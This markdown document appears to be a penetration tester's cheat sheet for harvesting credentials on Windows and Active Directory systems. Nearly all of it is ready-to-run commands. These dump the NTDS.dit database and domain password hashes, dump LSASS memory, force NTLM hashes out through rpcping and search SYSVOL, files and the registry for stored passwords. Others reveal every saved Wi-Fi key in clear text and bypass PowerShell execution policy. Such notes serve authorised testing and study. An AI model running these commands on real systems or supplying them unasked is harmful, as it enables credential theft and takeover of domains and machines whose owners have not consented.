
# Windows Password locations:
```
HKEY_LOCAL_MACHINE\Security\Cache
C:\Windows\System32\config\SECURITY 
C:\Windows\System32\NTDS.dit
```

# Full Backup of AD in "IFM" media mode
https://twitter.com/cnotin/status/1445047314788274177/photo/1
```
ntdsutil "ac in ntds" "ifm" "create full c:\windows\temp\crashpad\x" q q
```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)


# Dump the password hashes of all domain users
creates 2 files a txt file with password hashes and a csv with usernames
```
ntdsAudit.exe ntds.dit -s SYSTEM -p pwddump.txt -u users.csv
```


# Credential Harvesting
## Passwords In Files:
These are common files to find Passwords/Credentials in. They might be base64-encoded. So look out for that.
```
1. c:\sysprep.inf			[Clear Text Password]
2. c:\sysprep\sysprep.xml		[Base64 Encoded Password]
3. c:\unattend.xml
4. c:\unattended.txt 
5. %WINDIR%\Panther\Unattend\Unattended.xml
6. %WINDIR%\Panther\Unattended.xml
```
### Decode BASE64 in Linux
```
echo "<BASE64-Encoded_Password>" | base64 -d 
```

## cmdkey
https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/#credentials

List cached credentials
```
cmdkey /list
```
## findstr
https://lolbas-project.github.io/lolbas/Binaries/Findstr/#credentials

Search for stored password in Group Policy files stored on SYSVOL.
```
findstr /S /I cpassword \\sysvol\policies\*.xml
```
Find all passwords in all files.
```
findstr /spin "password" *.*
findstr /si password *.xml *.ini *.txt
findstr /si password *.txt *.ini *.config *.xml
findstr /si password *.txt | *.xml | *.ini | *.rdp | *.py | *.pl | *.log
```
Consider trying other variations of password like pass, cred, credentials, login, uid, etc. 

## rpcping
https://lolbas-project.github.io/lolbas/Binaries/Rpcping/#credentials

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
```
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```
## adplus.exe
https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/#dump

Creates a memory dump of the lsass process
```
adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet
```
## diskshadow
https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/

Execute commands using diskshadow.exe from a prepared diskshadow script.
```
diskshadow.exe /s c:\test\diskshadow.txt
```
## ntdsutil
https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ntdsutil/

Dumping of Active Directory NTDS.dit database into folder
```
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```

# search for unattended.xml files
```
Get-Childitem –Path C:\ -Include unattended.xml -Recurse -ErrorAction SilentlyContinue
```

## Find all those strings in config files.
1. web.config
2. php.ini
3. httpd.conf
4. access.log
5. vnc.ini (easy to decrypt)
6. ultravnc.ini (easy to decrypt)

```
dir /s *pass* == *cred* == *vnc* == *.config*
dir /s *pass*
dir /s *cred*
dir /s *vnc*
dir /s *.config
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Other Searches
```
dir c:\*unattend.xml /s /b
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

## systems with citrix:
check for c:\unattended.txt which may have clear text password for admin
if so:
```
RUNAS /U:LOCALADMIN CMD.EXE
```

# Passwords In Registry:
## VNC
```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

## Windows autologin
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\SpecialAccounts"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey"
```

## SNMP Paramters
```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

## Putty
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## Search for password in registry
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Same command but saves the output to the clipboard for easy pasting.
```
reg query HKLM /f password /t REG_SZ /s | clip 
reg query HKCU /f password /t REG_SZ /s | clip 
```
To further investigate:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Powershell:
search for specific files:
```
Get-Childitem –Path C:\ -Include *.py -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\ -Include *HSG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

grep a string:
search for any file that ends in .txt for the pattern (or string) pass
```
cd C:\
Select-String -Path *.txt -Pattern "pass"
ls -r | Select-String "test" | Select Path, LineNumber | Format-List
```

## Powershell search for all .txt files containing the phrase "password"
```
cd C:\
ls -r *.txt | Select-String -Pattern "password" | Select Path, LineNumber | Format-List
ls -r *.txt | Select-String -Pattern "password" -ErrorAction SilentlyContinue
```

# Powershell Wifi Passwords 
## Grab all wifi passwords and format the output to be easy to read:
```
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

# CMD WiFi Passwords
## Grab all wifi passwords and format the output to be easy to read:
```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### netsh wlan show profile
```
C:\>netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : NETGEAR59
```
### netsh wlan show profile name="NETWORK" key=clear
### netsh wlan show profile NETGEAR59 key=clear
```
C:\>netsh wlan show profile NETGEAR59 key=clear

Profile NETGEAR59 on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : NETGEAR59
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "NETGEAR59"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : password123		<== Clear Text Password

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

## search for python:
```
dir *.py /s /p
```

## search for perl:
```
dir *.pl /s /p
```

# Find proof.txt or local.txt
```
cd c:\Users\administrator\Desktop
dir *.txt /s /p

cd C:\
dir secret.doc /s /p
```
The /s option directs a search of all folders on the hard drive; the /p option pauses the display after each screen of text. Double-check everything!

## side note:
Execution Policy Bypass
```
powershell -ep bypass
```
